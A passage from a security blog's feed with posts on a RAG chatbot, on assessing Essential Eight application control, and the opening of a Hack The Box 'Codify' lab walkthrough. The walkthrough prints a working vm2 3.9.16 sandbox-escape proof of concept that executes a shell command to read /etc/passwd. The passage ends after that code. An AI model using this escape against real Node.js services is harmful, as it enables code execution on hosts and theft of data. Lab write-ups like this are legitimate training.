concern.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="upstream-changes"/><category term="git"/><category term="github"/><category term="git-pull"/><category term="git-fetch"/><summary type="html"><![CDATA[An overview of how to manage upstream changes in a GitHub repository]]></summary></entry><entry><title type="html">Using Retrieval Augmented Generation (RAG) for chatbots</title><link href="https://emdeh.github.io/blog/2024/rag-llm-chatbot/" rel="alternate" type="text/html" title="Using Retrieval Augmented Generation (RAG) for chatbots"/><published>2024-02-16T17:00:00+00:00</published><updated>2024-02-16T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/rag-llm-chatbot</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/rag-llm-chatbot/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>This project leverages a Retrieval Augmented Generation (RAG) implementation to create an intelligent question-answering system for a website. The project automates the collection of contextual data from the site, processes this data with an embeddings model to generate vector representations, and utilises these vectors to provide relevant answers to user queries through a chatbot using a Language Model (LLM) to craft responses in a conservational tone.</p> <p>You can find the code and a detailed overview in the <a href="https://github.com/emdeh/web-crawl-qna-blog-bot">Github repository</a>.</p> <h2 id="what-is-retrieval-augmented-generation-rag">What is Retrieval Augmented Generation (RAG)</h2> <p>Retrieval Augmented Generation (RAG) is a sophisticated approach that enhances the capabilities of generative models, particularly Large Language Models (LLMs), by integrating an additional information retrieval step into the response generation process. This method involves dynamically sourcing relevant external information to augment the input provided to the generative model, thereby enriching its responses with details and insights not contained within its pre-trained knowledge base. The retrieval of additional information is typically facilitated by embeddings and vector representations to identify content contextually similar to the user’s prompt.</p> <h2 id="what-are-embeddings">What are Embeddings</h2> <p>Embeddings are a form of representation learning where words, sentences, or even entire documents are converted into real-valued vectors in a high-dimensional space. This process aims to capture the semantic meanings, relationships, and context of words or phrases, allowing machines to process natural language data more effectively. The vectors in the high-dimensional space represent the nuanced characteristics of the text, such as syntax, semantics, and usage patterns, in a form that can be quantitatively analysed. Each dimension could correspond to a latent feature that captures different aspects of the text’s meaning, not directly interpretable by humans but discernible through computational methods. By mapping textual information to a geometric space, embeddings enable the measurement of conceptual similarity between pieces of text based on their positions and distances within this space, facilitating tasks like search, classification, and contextual understanding in natural language processing applications. In the context of Retrieval-Augmented Generation (RAG), embeddings represent the queries (prompts) and the potential knowledge sources in a format that a computer can understand and compare.</p> <h3 id="vector-representations">Vector Representations</h3> <p>Vector representations are the outcome of converting text into embeddings, representing text as points or vectors in a multi-dimensional space. As described above, each dimension corresponds to a feature of the text, capturing various aspects of its meaning, context, or syntactical properties. Comparing vector representations involves calculating the similarity (often using cosine similarity or other metrics) between vectors to identify how closely related two pieces of text are. In RAG implementations that use embeddings, the vector representation of a user’s prompt is compared to the vector representations of various knowledge sources to identify the most relevant context. This relevant context is then retrieved and used to augment the response generated by a language model, enhancing the LLM’s ability to provide accurate and contextually enriched answers.</p> <h2 id="credits">Credits</h2> <p>This project was initially inspired by <strong>OpenAI’s Web Q&amp;A with Embeddings tutorial</strong>. Learn how to crawl your website and build a Q/A bot with the OpenAI API. You can find the full tutorial in the <a href="https://platform.openai.com/docs/tutorials/web-qa-embeddings">OpenAI documentation</a>.</p> <h1 id="overview-of-a-rag-implementation">Overview of a RAG implementation</h1> <p>The diagram below briefly outlines how a Retrieval Augmented Generation (RAG) architecture leverages embeddings. In short, additional context is <em>retrieved</em> by comparing the vectors of the prompt to the vectors of the knowledge source. The related textual data is then appended to the prompt to <em>augment</em> the response <em>generated</em> by the LLM.</p> <p><img src="/assets/img/2024-rag-chatbot/diagram.png" alt="diagram"/></p> <h1 id="example-implementation">Example implementation</h1> <p><strong>Point 1:</strong> In the case of this particular implementation, the knowledge source is a blog. The knowledge is obtained by first extracting all the hyperlinks on the site and discarding any that point to other domains. Each unique hyperlink is then visited, and the content extracted into text files. The text files are then used to create a data frame. Each row in the data frame is tokenised to facilitate analysing the length of documents, which is relevant for understanding the data’s distribution and optimising model input sizes.</p> <p><strong>Point 2:</strong> After more processing to create smaller chunks (if required), the embeddings are generated and saved. In this case, to a <code class="language-plaintext highlighter-rouge">.csv</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;SNIP&gt;
https://emdeh.com/repositories
https://emdeh.com/news/announcement_7
https://emdeh.com/blog/2024/codify-walkthrough
Embeddings generated and saved to <span class="s1">'data/embeddings.csv'</span><span class="nb">.</span>
Preprocessing complete. Embeddings are ready.

<span class="c"># You can see the blog's links being iterated here.</span>
</code></pre></div></div> <p><strong>Points 3 - 5:</strong> When a user provides the prompt to the service, the embeddings model will generate its vector representation.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-prompt.png" alt="image of prompt"/></p> <p><strong>Point 6:</strong> The service then compares the prompt’s vector to the Vector DB (in this case, the <code class="language-plaintext highlighter-rouge">.csv</code> file containing the blog’s vector representations is loaded into another data frame).</p> <blockquote> <p><em>The comparision is done using Cosine function to calculate the distance between the question’s embedding and each row’s embedding in the data frame. Cosine distances is a measure used to determine the similarity between two vectors, with lower values indicating higher similarity.</em></p> </blockquote> <p>The service will then iterate over the data frame to accumulate the most similar text until it reaches a pre-defined token limit. This then forms the context for the original prompt.</p> <p><strong>Points 7 - 9:</strong> The context and original prompt are now passed to the GPT model, which returns a generative completion. This completion is presented back to the end-user.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-completion.png" alt="image of completion"/></p> <h1 id="code-overview">Code overview</h1> <h2 id="data-collection-and-preparation">Data Collection and Preparation</h2> <p><code class="language-plaintext highlighter-rouge">preprocess.py</code> crawls web pages within a specified domain and systematically navigates through the website, extracting text from each page it encounters. The collected text undergoes initial preprocessing to clean and organise the data, making it suitable for further analysis.</p> <p>The script then employs OpenAI’s API to generate embeddings for each piece of text. These embeddings capture the semantic essence of the text in a high-dimensional space, facilitating the identification of contextual similarities between different texts. The processed data and its embeddings are saved for subsequent use, laying the groundwork for the system’s question-answering capabilities.</p> <h2 id="flask-application-for-question-answering">Flask Application for Question Answering</h2> <p>With the data prepared, <code class="language-plaintext highlighter-rouge">app.py</code> serves as the interface between the user and the system’s NLP engine. This script initiates a Flask web application, providing endpoints for users to submit their questions.</p> <p>Upon receiving a query, the application leverages the previously generated embeddings to find the most relevant context within the collected data. It then formulates this context and the user’s question as input for an OpenAI GPT model. The model, trained on vast amounts of text from the internet, generates an answer that reflects the specific information in the crawled data and its understanding of the topic at large. The answer is then returned to the user through the web interface, completing the cycle of query and response.</p> <h2 id="integration-and-workflow">Integration and Workflow</h2> <p>Integrating <code class="language-plaintext highlighter-rouge">preprocess.py</code> and <code class="language-plaintext highlighter-rouge">app.py</code> creates a workflow that bridges web crawling and NLP-driven question-answering. Initially, <code class="language-plaintext highlighter-rouge">preprocess.py</code> lays the foundation by collecting and preparing the data, which <code class="language-plaintext highlighter-rouge">app.py</code> subsequently utilises to offer real-time answers. This allows the system to provide contextually relevant answers informed by the specific context. Users interact with the system through a straightforward web interface, making complex NLP capabilities accessible to anyone with a question to ask.</p> <h2 id="use-cases">Use-cases</h2> <p>Together, these scripts leverage sophisticated machine learning capabilities to demonstrate how existing data from websites can be harnessed to build robust and interactive AI-driven ways to retrieve and discover knowledge.</p> <p>For example, the basic capabilities demonstrated in this project could be applied to create a contextually-aware chatbot on a website.</p>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="RAG"/><category term="LLM"/><category term="NLP"/><category term="natural-language-processing"/><category term="retrieval-augmented-generation"/><category term="large-language-models"/><category term="chatbot"/><category term="python"/><category term="embeddings"/><summary type="html"><![CDATA[A simple example of how RAG can be used for a website's chatbot.]]></summary></entry><entry><title type="html">Application Control</title><link href="https://emdeh.github.io/blog/2024/essential-eight-application-control/" rel="alternate" type="text/html" title="Application Control"/><published>2024-01-25T17:00:00+00:00</published><updated>2024-01-25T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/essential-eight-application-control</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/essential-eight-application-control/"><![CDATA[<h1 id="introduction">Introduction</h1> <h2 id="control-objective">Control objective</h2> <p>The objective of the <strong>Application Control</strong> strategy is to ensure applications are only accessible from appropriate locations and to the appropriate users.</p> <h2 id="expectation">Expectation</h2> <p>It is expected that organisations have a comprehensive approach to managing and controlling the execution of software applications.</p> <p>The approach needs to include the full lifecycle of approving, deploying, and removing software applications. At higher maturity levels, log retention and monitoring are required.</p> <p>The scope of application control is also extended from just workstations to internet-facing servers at maturity level 2 and all workstations servers at maturity level 3.</p> <h2 id="implementing-application-control">Implementing application control</h2> <ul> <li>Identify business critical applications and formally approve their use.</li> <li>Develop application control rules to ensure only approved applications are allowed to execute.</li> <li>Maintain the application control rules using a change management program.</li> <li>Validate application control rules on an annual or more frequent basis. <h1 id="assessment-scope">Assessment scope</h1> </li> </ul> <p>When carrying out application control assessments, it’s important to consider paths related to standard user profiles and temporary directories that are utilised by operating systems, web browsers, and email clients. These can include:</p> <ul> <li><code class="language-plaintext highlighter-rouge">%userprofile%*</code></li> <li><code class="language-plaintext highlighter-rouge">%temp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%tmp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%windir%\Temp*</code></li> </ul> <p>Based on the system’s setup, some overlap may be present; for example, <code class="language-plaintext highlighter-rouge">%temp%</code> and <code class="language-plaintext highlighter-rouge">%tmp%</code> are usually found within <code class="language-plaintext highlighter-rouge">%userprofile%</code>.</p> <blockquote> <p><em>It is important to note that the last major update to the maturity model introduced compiled Hypertext Markup Language (HTML) (<code class="language-plaintext highlighter-rouge">.chm</code> files), HTML applications (<code class="language-plaintext highlighter-rouge">.hta</code> files) and control panel applets (<code class="language-plaintext highlighter-rouge">.cpl</code> files) to the list of file types that need to be controlled. Some application control solutions may not support these file types.</em></p> </blockquote> <h1 id="maturity-level-requirements">Maturity Level requirements</h1> <table> <tr> <th>Level 1</th> <th>Level 2</th> <th>Level 3</th> </tr> <tr> <td>-</td> <td><strong>Application control is implemented on workstations and internet-facing servers.</strong></td> <td>Application control is implemented on workstations and <strong>servers</strong>.</td> </tr> <tr> <td>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients.</td> <td><strong>Application control restricts</strong> the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets <strong>to an organisation-approved set</strong>.</td> <td>Application control restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications, control panel applets <strong>and drivers</strong> to an organisation-approved set.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended driver block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Application control rulesets are validated on an annual or more frequent basis.</strong></td> </tr> <tr> <td>-</td> <td><strong>Allowed and blocked execution events on workstations and internet-facing servers are logged.</strong></td> <td>Allowed and blocked execution events on workstations and <strong>servers</strong> are <strong>centrally</strong> logged.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are protected from unauthorised modification and deletion.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are monitored for signs of compromise and actioned when any signs of compromise are detected.</strong></td> </tr> </table> <p><br/></p> <h1 id="assessing-application-control">Assessing Application Control</h1> <p>To assess the effectiveness of application control strategies:</p> <ul> <li>Identify authorised programs.</li> <li>Identify the application control approach that is being used (if in place).</li> <li>Assess the controls using assessment methods and tools.</li> <li>Determine the associated maturity level.</li> </ul> <h1 id="assessment-methods">Assessment methods</h1> <p>Application control assessments are possible without tools, but the efficacy of the tests will be significantly reduced, and edge cases that malicious actors might exploit could be missed. For instance, these actors might deploy bespoke tools to enumerate weak paths in a system.</p> <p>The ACSC provides guidelines and recommendations on the methods and tools that can be used to assess the control.</p> <p>The only true way to test is to attempt execution in all locations against all file types.</p> <p><code class="language-plaintext highlighter-rouge">SysInternals AccessChk</code> application can be used to generate output of folder permissions, but this is only relevant, potentially, for Level 1.</p> <h2 id="e8mvt">E8MVT</h2> <p>Tests application control policies by attempting to write and execute certain file types in specific locations.</p> <p>Also checks for MSFT recommended block rules and drive block rules are implemented.</p> <h2 id="acvt">ACVT</h2> <p>tests application control policy by enumerating all sub-directories and attempts to write and execute each of the relevant file types from each location.</p> <h2 id="scripts">Scripts</h2> <h3 id="get-applocker-policies">Get AppLocker Policies</h3> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="nt">-Xml</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Set-Content</span><span class="w"> </span><span class="p">(</span><span class="s1">'c:\windows\temp\curr.xml'</span><span class="p">)</span><span class="se">`</span><span class="w">
</span></code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Windows\System32\</span><span class="o">*.</span><span class="nf">exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p>Test in calc.exe or notepad.exe:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-XMLPolicy</span><span class="w"> </span><span class="nx">C:\windows\temp\curr.xml</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\windows\system32\calc.exe</span><span class="p">,</span><span class="w"> </span><span class="nx">C:\windows\system32\notepad.exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p><br/> <br/></p> <h3 id="sysinternals-accesschk">Sysinternals accesschk</h3> <p>If only trusted Microsoft tools are permitted on the system, <strong>SysInternals AccessChk</strong> can be used for outputting folder permissions, noting this is only suitable for a path-based approach to implementing the control.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">accesschk</span><span class="w"> </span><span class="nt">-dsuvw</span><span class="w"> </span><span class="p">[</span><span class="n">path</span><span class="p">]</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">report.txt</span><span class="w">
</span></code></pre></div></div> <p>Running <code class="language-plaintext highlighter-rouge">whoami /groups</code> would also need to be executed to determine which user groups a typical standard user belonged to in order to determine the effective permissions for each path.</p> <p>This approach is, however, likely to be tedious in assessing effectively. <br/></p> <h1 id="maturity-level-1-guidance">Maturity Level 1 guidance</h1> <p>The intent of application control at Maturity Level 1 can be met without a dedicated application control solution. This is achieved through file system permissions to prevent unnecessary access to user profile directories and temporary folders.</p> <blockquote> <p><strong><em>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients</em>.</strong></p> </blockquote> <p>Given how complex file system permissions can become, to effectively check application control it’s essential to attempt to write and execute from all user-accessible directories.</p> <p>ACSC’s Essential Eight Maturity Verification (E8MVT) and Application Control Verification (ACVT) tools (available to ACSC partners) can assist in achieving this. A number of other tools on the market are also capable enumerating a file system to perform this test.</p> <p>Where applicable, PowerShell cmdlets can be used to test and review AppLocker policies and Sysinternals acesschk can be used if only Microsfot-based tools are avaialble.</p> <p>For a system on which tools cannot be run, and assuming a path-based approach is used, screenshots of the ‘effective access’ permissions for specified folders can be requested. This, however, has limitations because unless screenshots of access permissions are requested for every folder and sub-folder (for which there are usually many), it will not be possible to comprehensively assess whether read, write and execute permissions exist for a given user. Consequently, this will likely impact the quality of evidence cited in the final report.</p> <p>At a minimum, screenshots for key paths (such as temporary folders used by the operating system, web browsers and email clients) should be requested and examined to determine whether inheritance is set, noting that at any point in a path, application control inheritance previously set by an operating system may be disabled by an application installer</p> <h1 id="maturity-level-2-guidance">Maturity Level 2 guidance</h1> <p>Whereas ML1 is focussed on EUC endpoints, ML2 extends application control to internet-facing servers and includes additional log-retention requirements.</p> <h1 id="maturity-level-3-guidance">Maturity Level 3 guidance</h1> <p>ML3 builds on ML2 in that it requires monitoring of logs, application control on <em>all</em> servers, and the implementation of Microsoft’s block rules. Application control rulesets also need to be validated no less than annually. <br/></p> <h1 id="other-information">Other information</h1> <h2 id="considering-kernel">Considering Kernel</h2> <p>Modern computers split virtual memory into kernel and user space. The scope to which an application control solution protects a system’s kernel should be considered.</p> <h2 id="identifying-adversary-attempts-to-execute-malicious-code">Identifying adversary attempts to execute malicious code</h2> <p>Application control can help identify attempts to execute malicious code.</p> <p>This can be achieved by configuring application control to generate event logs for allowed and blocked executions.</p> <p>Event logs should included relevant information such as:</p> <ul> <li>name of the file</li> <li>date/time stamp</li> <li>username of the executing user</li> </ul> <p>Application control logs can also ingest into a SIEM/SOAR system to allow for and contribute to broader context about the threat landscape.</p> <h2 id="applocker-and-wdac">AppLocker and WDAC</h2> <p>AppLocker and Windows Defender Application Control (WDAC) are both security features in Windows, designed to control application usage and restrict unauthorised software. However, they have distinct differences:</p> <ol> <li><strong>Design and Purpose</strong>: <ul> <li><strong>AppLocker</strong>: Primarily aimed at providing administrators with the ability to specify which users or groups can run particular applications, based on unique identities of files. It’s more about managing application access than outright security.</li> <li><strong>WDAC</strong>: Focuses more on security. It is designed to prevent malware and untrusted applications from running by enforcing code integrity policies.</li> </ul> </li> <li><strong>Scope and Control</strong>: <ul> <li><strong>AppLocker</strong>: Works at a more granular level, allowing control over scripts, executable files, Windows Installer files, DLLs, and packaged app installers.</li> <li><strong>WDAC</strong>: Controls the entire spectrum of executable code on the system, including kernel mode drivers and user mode applications.</li> </ul> </li> <li><strong>Implementation and Management</strong>: <ul> <li><strong>AppLocker</strong>: Managed through Group Policy, making it easier to implement in an environment already using Group Policy for configurations.</li> <li><strong>WDAC</strong>: Managed through PowerShell and uses a different policy format, which can be more complex to set up but offers a higher level of security. -</li> </ul> </li> <li><strong>Flexibility and Usability</strong>: <ul> <li><strong>AppLocker</strong>: Offers more flexibility and is simpler to configure, especially for smaller organizations or those with less complex needs.</li> <li><strong>WDAC</strong>: While it provides a stronger security posture, it can be more challenging to implement and manage, particularly in environments with diverse applications.</li> </ul> </li> <li><strong>System Requirements</strong>: <ul> <li><strong>AppLocker</strong>: Available on Windows 7 and newer versions but only for Enterprise and Ultimate editions.</li> <li><strong>WDAC</strong>: Available on Windows 10 and Windows Server 2016 and later, offering broader support across different Windows editions.</li> </ul> </li> <li><strong>Security Level</strong>: <ul> <li><strong>AppLocker</strong>: Considered less robust in terms of security compared to WDAC, as it lacks the more comprehensive system-wide controls.</li> <li><strong>WDAC</strong>: Provides a more secure environment by ensuring that only trusted software runs on the system.</li> </ul> </li> </ol> <p>In summary, while AppLocker is more user-friendly and easier to manage, particularly for application access control, WDAC offers a more comprehensive and secure approach, focusing on system integrity and malware prevention. The choice between the two would depend on the specific needs and capabilities of the organisation, particularly in terms of desired security level and ease of management.</p> <h1 id="useful-resources">Useful resources</h1> <ul> <li><a href="https://learn.microsoft.com/en-us/compliance/essential-eight/e8-app-control">Essential Eight application control - Essential Eight | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules">Microsoft recommended driver block rules - Windows Security | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac">Applications that can bypass WDAC and how to block them - Windows Security | Microsoft Learn</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/small-business-cyber-security/small-business-cloud-security-guide/technical-example-application-control">Technical example: Application control | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><category term="application-control"/><summary type="html"><![CDATA[Assessing Application Control]]></summary></entry><entry><title type="html">Codify - Arbitraty code execution and stealing hashes.</title><link href="https://emdeh.github.io/blog/2024/codify-walkthrough/" rel="alternate" type="text/html" title="Codify - Arbitraty code execution and stealing hashes."/><published>2024-01-25T14:14:00+00:00</published><updated>2024-01-25T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/codify-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/codify-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <hr/> <p>Codify presents as a moderately challenging easy box, characterised by a privilege escalation that requires a bit of knowledge of bash secure scripting.</p> <p>Initial access is obtained by web-based Node.js code editor sandbox that allows arbitrary code execution on the host. Arbitrary code is then leveraged to fetch a reverse shell and achieve remote code execution.</p> <p>From there a hash is stolen following further system enumeration. Cracking the hash enables laterally movement, and privilege escalation is achieved by exploiting a vulnerability in a custom backup script that a standard user has elevated privileges over.</p> <p>The box exemplifies the importance of secure coding practices, and the need to use strong, complex, passphrases.</p> <h2 id="methods">Methods</h2> <h3 id="sandbox-escape">Sandbox escape</h3> <p>A sandbox escape refers to an exploit in which malicious code or software breaks out of the sandbox environment in which it’s supposed to be contained. Sandboxing is a security mechanism that isolates applications, processes, or code to reduce the potential harm from a compromised system.</p> <h3 id="arbitrary-code-execution">Arbitrary code execution</h3> <p>Arbitrary code execution is a security vulnerability that occurs when an attacker gains the ability to execute any code of their choice on a target system. This type of exploit allows the attacker to run commands that the system’s designers did not intend to permit, often leading to unauthorised actions such as data theft, system compromise, or further exploitation of other vulnerabilities.</p> <p>Key aspects of arbitrary code execution include:</p> <ol> <li> <p><strong>Control Over Execution Flow:</strong> The attacker finds a way to divert the normal execution flow of a program, injecting or directing it to run unexpected code.</p> </li> <li> <p><strong>Running Unauthorised Commands:</strong> The code executed can do anything that the application’s permissions allow, depending on the system’s privileges and security controls.</p> </li> <li> <p><strong>Common Causes:</strong> It often results from vulnerabilities like buffer overflows, injection flaws, insecure deserialization, or other weaknesses that allow an attacker to inject malicious code into a process.</p> </li> <li> <p><strong>Severity:</strong> Arbitrary code execution is considered a severe security issue because it can lead to complete system takeover, data breaches, or serve as a gateway for further attacks.</p> </li> <li> <p><strong>Mitigation:</strong> Prevention includes secure coding practices, input validation, using memory-safe languages, regular security testing, and keeping systems updated with security patches.</p> </li> </ol> <h3 id="remote-code-execution">Remote code execution</h3> <p>Remote Code Execution (RCE) is a severe security vulnerability that allows an attacker to run arbitrary code on a target machine or server across a network, such as the internet, without having physical access to it. This type of vulnerability is particularly dangerous as it can be exploited remotely to gain control over another system.</p> <p>The distinction between RCE and ACE lies in the attack vector.</p> <ul> <li>RCE is specifically about remote exploitation, where the attack occurs over a network.</li> <li>ACE is a broader term that covers any situation (both local and remote) where an attacker can execute code of their choice but does not specify the method of delivery.</li> </ul> <p>In the context of this post, the arbitrary code execution relates to running commands in the codify editor that the system did not intend to allow, whereas remote code execution relates to when a reverse shell is established and execution of commands was done remotely to the system.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap">Nmap</a></li> <li><a href="https://github.com/koalaman/shellcheck">Shellcheck</a></li> <li><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li>Dictionary attack (Hashcat)</li> <li>Brute forcing (glob matching)</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration starts with Nmap scanning.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> 10.129.6.167 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-24 04:53 GMT
Nmap scan report <span class="k">for </span>10.129.6.167
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.50 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>3000</li> </ul> </li> <li>Domain name http://codify.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain http://codify.htb can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.6.167 codify.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.6.167 codify.htb
</code></pre></div></div> <p>This makes it reachable and reveals a page that purports to allow Node.js code to be tested in a sandbox environment. The site states that:</p> <blockquote> <p><em>“Codify is a simple web application that allows you to test your Node.js code easily…Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system.”</em></p> </blockquote> <p><img src="/assets/img/2024-codify/20240125-codify-webpage.png" alt="20240125-codify-webpage.png" class="auto-resize"/></p> <p>The site also lists some limitations that are in place for security of the platform. These include restricting the importation of <code class="language-plaintext highlighter-rouge">child_processes</code> and <code class="language-plaintext highlighter-rouge">fs</code> modules.</p> <p>The site goes on to say:</p> <blockquote> <p>“<em>This is to prevent users from executing arbitrary system commands, which could be a major security risk.</em>”</p> </blockquote> <p>Then lists the following modules as being available for import:</p> <ul> <li>url</li> <li>crypto</li> <li>util</li> <li>events</li> <li>assert</li> <li>stream</li> <li>path</li> <li>os</li> <li>zlib</li> </ul> <p>Another page details that the Code Editor uses the <strong>vm2</strong> library. Clicking the link leads to the <strong>3.9.16 version release of vm2</strong>.</p> <p>Researching <strong>vm2</strong> version 3.9.16 reveals a critical <strong>sandbox breakout</strong> vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2023-29199</p> <blockquote> <p>“<em>attackers (can) bypass <code class="language-plaintext highlighter-rouge">handleException()</code> and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context…</em>”</p> </blockquote> <h2 id="what-is-nodejs">What is Node.js</h2> <p>Node.js is an open-source, cross-platform JavaScript runtime environment that executes JavaScript code outside of a web browser. It’s built on Chrome’s V8 JavaScript engine and allows developers to use JavaScript to write command-line tools and for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user’s web browser.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="proof-of-concept">Proof of Concept</h2> <p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></p> <p><strong>vm2</strong> is a module in Node.js that creates isolated environments (sandboxes) to safely run untrusted JavaScript code. In <strong>version 3.9.16 of vm2</strong>, there is a security flaw in the way it processes errors or exceptions. Normally, vm2 should prevent code inside the sandbox from affecting or accessing the host system. The flaw involves a complex interaction where a custom error object can be manipulated to bypass vm2’s security checks. By exploiting this, an attacker can execute any code they want on the host system, not just within the sandbox.</p> <p>An example of how this vulnerability could be used to display the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, which is a common file in Unix-like systems that contains user account information is:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>

